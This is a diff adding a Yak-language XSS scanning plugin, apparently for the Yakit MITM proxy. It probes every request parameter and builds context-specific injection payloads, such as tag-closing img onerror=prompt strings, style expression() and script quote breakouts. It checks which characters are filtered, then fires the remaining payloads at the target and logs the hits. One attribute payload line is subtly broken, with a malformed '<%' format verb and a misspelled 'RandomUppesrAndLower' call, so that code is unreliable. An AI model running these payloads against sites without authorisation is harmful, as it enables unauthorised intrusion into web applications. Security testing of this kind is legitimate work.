@@ -1,0 +1,422 @@
+debug = true
+origin_yakit_output = yakit_output
+
+yakit_output = 1
+if debug {
+    log.setLevel("debug")
+    yakit_output = func(v...) {println(v...)}
+} else {
+    log.setLevel("info")
+    yakit_output = origin_yakit_output
+}
+
+
+/*
+value: payload
+dangerousChars: 一些可能会被过滤/转义的危险字符
+payloadType: payload类型，
+    1.(tag)标签内文本: 构造标签闭合
+    2.(attr)属性: 构造标签闭合或伪协议,如果是(spec-attr)特殊属性可以直接使用javascript代码
+    3.(comment)注释：构造标签闭合
+    4.(js)script 标签内：构造标签闭合或dom型
+*/
+newPayload = func(value, dangerousChars, payloadType) {
+    return {"value": value, "dangerousChars": dangerousChars, "payloadType": payloadType }
+}
+
+/*
+maybeVuln: 漏洞可能存在(即可能误报)
+url: 漏洞url
+param: 漏洞点参数
+payload: 参考newPayload
+*/
+newResult = func(maybeVuln, url, param, payload, reqRaw, respRaw) {
+    return {"maybeVuln": maybeVuln, "url": url, "param": param, "payload": payload, "reqRaw": reqRaw, "respRaw": respRaw }
+}
+
+// 过滤一些特殊的params
+filterParams = func(params) {
+    newParams = make([]var)
+    for _, param = range params {
+        // 对post中的submit参数进行过滤
+        if param.Name() == "submit" && str.HasPrefix(param.PositionVerbose(), "post") {
+            continue   
+        }
+        newParams = append(newParams, param)
+    }
+    return newParams
+
+}
+
+// 特殊标签判断
+specialAttr = func(attrName) {
+    attrName = str.ToUpper(attrName)
+    return attrName == "ONAFTERPRINT" || attrName == "ONBEFOREPRINT" || attrName == "ONBEFOREONLOAD" || attrName == "ONBLUR" || attrName == "ONERROR" || attrName == "ONFOCUS" || attrName == "ONHASCHANGE" || attrName == "ONLOAD" || attrName == "ONMESSAGE" || attrName == "ONOFFLINE" || attrName == "ONONLINE" || attrName == "ONPAGEHIDE" || attrName == "ONPAGESHOW" || attrName == "ONPOPSTATE" || attrName == "ONREDO" || attrName == "ONRESIZE" || attrName == "ONSTORAGE" || attrName == "ONUNDO" || attrName == "ONUNLOAD" || attrName == "ONBLUR" || attrName == "ONCHANGE" || attrName == "ONCONTEXTMENU" || attrName == "ONFOCUS" || attrName == "ONFORMCHANGE" || attrName == "ONFORMINPUT" || attrName == "ONINPUT" || attrName == "ONINVALID" || attrName == "ONRESET" || attrName == "ONSELECT" || attrName == "ONSUBMIT" || attrName == "ONKEYDOWN" || attrName == "ONKEYPRESS" || attrName == "ONKEYUP" || attrName == "ONCLICK" || attrName == "ONDBLCLICK" || attrName == "ONDRAG" || attrName == "ONDRAGEND" || attrName == "ONDRAGENTER" || attrName == "ONDRAGLEAVE" || attrName == "ONDRAGOVER" || attrName == "ONDRAGSTART" || attrName == "ONDROP" || attrName == "ONMOUSEDOWN" || attrName == "ONMOUSEMOVE" || attrName == "ONMOUSEOUT" || attrName == "ONMOUSEOVER" || attrName == "ONMOUSEUP" || attrName == "ONMOUSEWHEEL" || attrName == "ONSCROLL" || attrName == "ONABORT" || attrName == "ONCANPLAY" || attrName == "ONCANPLAYTHROUGH" || attrName == "ONDURATIONCHANGE" || attrName == "ONEMPTIED" || attrName == "ONENDED" || attrName == "ONERROR" || attrName == "ONLOADEDDATA" || attrName == "ONLOADEDMETADATA" || attrName == "ONLOADSTART" || attrName == "ONPAUSE" || attrName == "ONPLAY" || attrName == "ONPLAYING" || attrName == "ONPROGRESS" || attrName == "ONRATECHANGE" || attrName == "ONREADYSTATECHANGE" || attrName == "ONSEEKED" || attrName == "ONSEEKING" || attrName == "ONSTALLED" || attrName == "ONSUSPEND" || attrName == "ONTIMEUPDATE" || attrName == "ONVOLUMECHANGE" || attrName == "ONWAITING" || attrName == "ONTOUCHSTART" || attrName == "ONTOUCHMOVE" || attrName == "ONTOUCHEND" || attrName == "ONTOUCHENTER" || attrName == "ONTOUCHLEAVE" || attrName == "ONTOUCHCANCEL" ||  attrName == "ONGESTURESTART" || attrName == "ONGESTURECHANGE" || attrName == "ONGESTUREEND" || attrName == "ONPOINTERDOWN" || attrName == "ONPOINTERUP" || attrName == "ONPOINTERCANCEL" || attrName == "ONPOINTERMOVE" || attrName == "ONPOINTEROVER" || attrName == "ONPOINTEROUT" || attrName == "ONPOINTERENTER" || attrName == "ONPOINTERLEAVE" || attrName == "ONGOTPOINTERCAPTURE" || attrName == "ONLOSTPOINTERCAPTURE" || attrName == "ONCUT" || attrName == "ONCOPY" || attrName == "ONPASTE" || attrName == "ONBEFORECUT" || attrName == "ONBEFORECOPY" || attrName == "ONBEFOREPASTE" || attrName == "ONAFTERUPDATE" || attrName == "ONBEFOREUPDATE" || attrName == "ONCELLCHANGE" || attrName == "ONDATAAVAILABLE" || attrName == "ONDATASETCHANGED" || attrName == "ONDATASETCOMPLETE" || attrName == "ONERRORUPDATE" || attrName == "ONROWENTER" || attrName == "ONROWEXIT" || attrName == "ONROWSDELETE" || attrName == "ONROWINSERTED" || attrName == "ONCONTEXTMENU" || attrName == "ONDRAG" || attrName == "ONDRAGSTART" || attrName == "ONDRAGENTER" || attrName == "ONDRAGOVER" || attrName == "ONDRAGLEAVE" || attrName == "ONDRAGEND" || attrName == "ONDROP" || attrName == "ONSELECTSTART" || attrName == "ONHELP" || attrName == "ONBEFOREUNLOAD" || attrName == "ONSTOP" || attrName == "ONBEFOREEDITFOCUS" || attrName == "ONSTART" || attrName == "ONFINISH" || attrName == "ONBOUNCE" || attrName == "ONBEFOREPRINT" || attrName == "ONAFTERPRINT" || attrName == "ONPROPERTYCHANGE" || attrName == "ONFILTERCHANGE" || attrName == "ONREADYSTATECHANGE" || attrName == "ONLOSECAPTURE" || attrName == "ONDRAGDROP" || attrName == "ONDRAGENTER" || attrName == "ONDRAGEXIT" || attrName == "ONDRAGGESTURE" || attrName == "ONDRAGOVER" || attrName == "ONCLOSE" || attrName == "ONCOMMAND" || attrName == "ONINPUT" || attrName == "ONCONTEXTMENU" || attrName == "ONOVERFLOW" || attrName == "ONOVERFLOWCHANGED" || attrName == "ONUNDERFLOW" || attrName == "ONPOPUPHIDDEN" || attrName == "ONPOPUPHIDING" || attrName == "ONPOPUPSHOWING" || attrName == "ONPOPUPSHOWN" || attrName == "ONBROADCAST" || attrName == "ONCOMMANDUPDATE" || attrName == "STYLE"
+}
+
+// 特殊标签payload
+specialAttrPayload = func(attrName, verifyRandStr) {
+    payload = ""
+
+    if attrName == "STYLE" {
+        payload = sprintf("xss: expression(prompt(\"%s\"))", verifyRandStr)
+    } else {
+        payload = sprintf("prompt('%s')", verifyRandStr)
+    }
+
+    return payload
+}
+
+// 检查错误并退出
+checkErr = func(err) {
+    if err != nil {
+        yakit_output(sprintf("XSS-DETECT error: %s", err.Error()))
+        os.Exit(1)
+    }
+}
+
+// 最后结果 日志输出
+xssLog = func(result, saveDB) {
+    maybeVuln = result.maybeVuln
+    url = result.url
+    param = result.param 
+    payload = result.payload
+    reqRaw = result.reqRaw  
+    respRaw = result.respRaw
+    msg = "Found xss"
+
+    if maybeVuln {
+        msg = "Maybe xss"
+    }
+    payloadString := sprintf("%s=%s", param.Name(), payload.value)
+
+    report = {"message": msg, "payload": payloadString, "payload_type": payload.payloadType, "param_position": param.PositionVerbose()}
+    
+    yakit_output(report)
+    if saveDB {
+        risk.NewRisk(
+            url,
+            risk.title(sprintf("XSS for: %v", url)),
+            risk.details(report),
+            risk.type("xss"),
+            risk.payload(payloadString),
+            risk.request(reqRaw), 
+            risk.response(respRaw),
+            risk.severity("warning"),
+        )
+    }
+}
+
+// 将参数在页面中回显的payload 存入数据库中
+EchoLog = func(result) {
+    url = result.url
+    param = result.param 
+    payload = result.payload
+    reqRaw = result.reqRaw  
+    respRaw = result.respRaw
+    payloadString := sprintf("%s=%s", param.Name(), payload.value)
+    report = {"message": "XSS echo", "payload": payloadString, "payload_type": payload.payloadType, "param_position": param.PositionVerbose()}
+
+    risk.NewRisk(
+        url,
+        risk.title(sprintf("Echo for: %v %s: %s", url, param.PositionVerbose(), param.Name())),
+        risk.details(report),
+        risk.type("xss-echo"),
+        risk.payload(payloadString),
+        risk.request(reqRaw),
+        risk.response(respRaw),
+        risk.severity("low"),
+    )
+}
+
+
+// fuzz并返回原始请求与原始响应
+Rawfuzz = func(param, fuzzPayload) {
+    freq = param.Fuzz(fuzzPayload)
+    httpReq, err = freq.GetFirstFuzzHTTPRequest()
+    checkErr(err)
+    rawReq, err = httpReq.GetOriginHTTPRequest()
+    checkErr(err)
+    reqBody, err = http.dump(rawReq)
+    checkErr(err)
+    reqBody = string(reqBody)
+    respChannel,err =  freq.Exec()
+    checkErr(err)
+    rsp = <-respChannel
+    respBody, err = str.ExtractBodyFromHTTPResponseRaw(rsp.ResponseRaw)
+    checkErr(err)
+
+    return rsp.Response, reqBody, respBody
+}
+
+payloadFuzzTask = func(swg, resultCh, url, param, verifyRandStr, payload) {
+    swg.Add()
+
+    go func {
+        defer swg.Done()
+
+        rsp, reqBody, newBody = Rawfuzz(param, payload.value)
+
+        // 客户端/服务端错误则不验证
+        if rsp.StatusCode >= 400 {
+            return
+        }
+
+        existVuln = false
+        maybeVuln = false
+        extraMsg = ""
+        payloadType = payload.payloadType
+
+        if payloadType == "js" {
+        verifyMatchNodes = xhtml.Find(newBody, verifyRandStr) // js类型的payload判断漏洞存在条件为: js中包含"verifyRandStr"这个字符串字面量
+            for _, matchNode = range verifyMatchNodes {
+                if matchNode.TagName != "script" {
+                    continue
+                }
+                result,err = js.ASTWalk(matchNode.MatchText)
+                if err != nil { // 如果ASTWalk报错，则可能存在xss
+                    existVuln = true
+                    maybeVuln = true
+                    break
+                }
+
+
+                for _,s = range result.StringLiteral{
+                    if s == verifyRandStr {
+                        existVuln = true
+                        break
+                    }
+                }
+
+                if len(result.BadSyntax) > 0 { // 如果js语法出现错误，则可能存在xss
+                    existVuln = true
+                    maybeVuln = true
+                    break
+                }
+            }
+        } else {
+            if payloadType == "comment" { // comment类型的payload判断漏洞存在条件: 逃出注释
+                verifyMatchNodes = xhtml.Find(newBody, verifyRandStr)
+                for _, matchNode = range verifyMatchNodes {
+                    if matchNode.IsText() && matchNode.MatchText == verifyRandStr {
+                        existVuln = true
+                        break
+                    }
+                }
+            } elif str.HasPrefix(payloadType, "spec") { // ! 对spec-attr类型的漏洞不做判断,可能存在误报
+                existVuln = true
+                maybeVuln = true
+            } else { // tag或attr类型的payload判断漏洞存在条件: 存在属性值为verifyRandStr的节点，证明标签逃逸或者属性逃逸
+                verifyMatchNodes = xhtml.Find(newBody, verifyRandStr)
+                for _, matchNode = range verifyMatchNodes {
+                    if matchNode.IsAttr() && matchNode.Key == "id" && matchNode.Val == verifyRandStr {
+                        existVuln = true
+                        break
+                    }
+                }
+            }
+        }
+
+        if existVuln {
+            result = newResult(maybeVuln, url, param, payload, reqBody, newBody)
+            resultCh <- result
+        } else {
+            // 如果判断不存在漏洞，就将有回显的位置payload写入数据库中，防止误报
+            // EchoLog(newResult(false, url, param, payload, reqBody, newBody))
+        }
+    }
+}
+
+paramFuzzTask = func(threads, url, param) {
+    // ! 一 判断参数存在的位置
+    randStr = str.RandStr(5)
+    verifyRandStr =  str.RandStr(8)
+
+    _, reqBody, rawBody = Rawfuzz(param, randStr)
+
+    // ! 二 从节点中找到随机字符串所在位置
+    matchNodes = xhtml.Find(rawBody, randStr)
+
+    /*
+        ! 三 根据节点位置分出类型
+        1.(tag)标签内文本: 构造标签闭合
+        2.(attr)属性: 构造标签闭合或伪协议,如果是特殊属性可以直接使用javascript代码
+        3.(comment)注释：构造标签闭合
+        4.(js)script 标签内：构造标签闭合或dom型
+    */
+    payloads = []
+
+    for _, matchNode = range matchNodes {
+
+        if matchNode.IsText() {
+            /*
+            4. script标签内
+            例：<script>a = '<参数>';</script>
+            */
+            if matchNode.TagName == "script" {
+                // 引号判断
+                matchText = matchNode.MatchText
+                randStrIndex = str.Index(matchNode.MatchText, randStr)
+                quote = ""
+                for {
+                    randStrIndex -= 1
+                    if randStrIndex < 0{
+                        break
+                    }
+                    chr = string(matchText[randStrIndex])
+                    if chr == "=" {
+                        break
+                    } elif chr == "\"" {
+                        quote = "\""
+                    }elif chr == "'" {
+                        quote = "'"
+                    }
+                }
+
+                payloads = append(payloads, newPayload(sprintf("1%s;prompt('%s');%s", quote, verifyRandStr, quote), ";"+quote, "js"))
+
+                payloads = append(payloads, newPayload(sprintf("1%s;</%s><%s id='%s' src=1 onerror='prompt(1)'><%s>%s", quote, xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), quote), "<>"+quote, "tag"))
+            } else {
+                /*
+                1.标签内文本: 构造标签闭合
+                例：<div><参数></div>
+                */
+                payloads = append(payloads, newPayload(sprintf("</%s><%s id='%s' src=1 onerror='prompt(1)'><%s>", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName)), "<>", "tag"))
+            }
+        } elif matchNode.IsAttr() {
+            /*
+            2.属性: 构造标签闭合或伪协议,如果是特殊属性可以直接使用javascript代码
+            例：<div id="<参数>"></div> <img src=1 onerror="<参数>"></div>
+            */
+            attrName = str.ToUpper(matchNode.Key)
+
+            // 特殊属性处理
+            if specialAttr(attrName) {
+                payload = specialAttrPayload(attrName, verifyRandStr)
+                payloads = append(payloads, newPayload(payload, "", "spec-attr"))
+            } else {
+                payload = sprintf("\"></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s=\"", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
+                payloads = append(payloads, newPayload(payload, "<>/", "attr"))
+
+                payload = sprintf("'></%s><% id='%s' src=1 onerror='prompt(1)'><%s %s='", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUppesrAndLower(matchNode.TagName), matchNode.Key)
+                payloads = append(payloads, newPayload(payload, "<>/", "attr"))
+
+                payload = sprintf("></%s><%s id='%s' src=1 onerror='prompt(1)'><%s %s=", xhtml.RandomUpperAndLower(matchNode.TagName), xhtml.RandomUpperAndLower("img"), verifyRandStr, xhtml.RandomUpperAndLower(matchNode.TagName), matchNode.Key)
+                payloads = append(payloads, newPayload(payload, "<>/", "attr"))
+            }
+        } elif matchNode.IsCOMMENT() {
+            /*
+            3.注释：构造标签闭合
+            例：<!-- <参数> -->
+            */
+            payloads = append(payloads, newPayload(sprintf("-->%s<%s>prompt(1);</%s><!--", verifyRandStr, xhtml.RandomUpperAndLower("script"), xhtml.RandomUpperAndLower("script")), "<>-", "comment"))
+        }
+    }
+    log.debug(sprintf("[%d] payloads: %s", len(payloads), payloads))
+
+    // ! 四 检测危险字符并过滤payload
+    filterChars = []
+    allDangerousChars = ["<", ">", "'", "\"", "/", "-"]
+    i = 0
+
+    detectPayload = randStr + str.Join(allDangerousChars, randStr) + randStr
+    resp, err = param.Fuzz(detectPayload).Exec()
+    checkErr(err)
+    rspo = <-resp
+    body, err = str.ExtractBodyFromHTTPResponseRaw(rspo.ResponseRaw)
+    checkErr(err)
+    randStrFromIndex = string(body)
+
+    for {
+        n, btChr = xhtml.MatchBetween(randStrFromIndex, randStr, randStr, 50)
+        if n == -1 || i >= len(allDangerousChars){
+            break
+        }
+
+        if allDangerousChars[i] != btChr {
+            pass = false
+            filterChars = append(filterChars, string(allDangerousChars[i]))
+        }
+        randStrFromIndex = randStrFromIndex[n:]
+        i += 1
+    }
+    log.debug(sprintf("[%d]filterChars: %s", len(filterChars), filterChars))
+
+    // ! 五 根据filterChars判断能使用的payload进行Fuzz，找到xss
+    swg = sync.NewSizedWaitGroup(threads)
+    resultCh = make(chan map[string]var, len(payloads))
+
+
+    for _, payload = range payloads {
+        isFilter = false
+
+        for _, filterChar = range filterChars {
+            if str.Contains(payload.dangerousChars, filterChar) {
+                isFilter = true
+            }
+        }
+        if isFilter {
+            // 如果被过滤了，就将有回显的位置payload写入数据库中，防止误报
+            // EchoLog(newResult(false, url, param, payload, reqBody, rawBody))
+            continue
+        }
+        log.debug(sprintf("Available payload: %s payloadType: %s dangerousChars: %s", payload.value, payload.payloadType, payload.dangerousChars))
+
+        payloadFuzzTask(swg, resultCh, url, param, verifyRandStr, payload)
+    }
+
+    swg.Wait()
+    close(resultCh)
+
+    
+    // ! 六 输出结果
+    saveDB = true 
+    for result = range resultCh {
+        xssLog(result, saveDB)
+        if saveDB {
+            saveDB = false
+        }
+    }    
+}
+
+
+
+__test__ = func() {
+    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://127.0.0.1:8990/xss/example4.php?name=hacker&v=hacker2")
+    if err != nil {
+        return
+    }
+    isHttps, url, reqRaw, rspRaw, body = results
+    mirrorFilteredHTTPFlow(results...)
+}
+
+
+mirrorFilteredHTTPFlow = func(ishttps, url, req, rsp, body) {
+    threads = 10
+    pathDetect = true
+
+    // 构造fuzz请求
+    freq, err = fuzz.HTTPRequest(req, fuzz.https(ishttps))
+    checkErr(err)
+
+    // 获取参数，包含post json、post form、get参数、cookie参数 路径参数（会自动过滤PHPSESSID、_ga、_gid等参数）
+    
+    params = freq.GetCommonParams()
+    
+
+    if pathDetect {
+        pathAppendParams = freq.GetPathAppendParams()
+        params = append(params, pathAppendParams...)
+        pathBlockParams = freq.GetPathBlockParams()
+        params = append(params, pathBlockParams...)
+    }
+    
+    params = filterParams(params)
+    
+
+    // 遍历所有param进行fuzz
+    for _, param = range params {
+        paramFuzzTask(threads, url, param)
+    }
+
+}
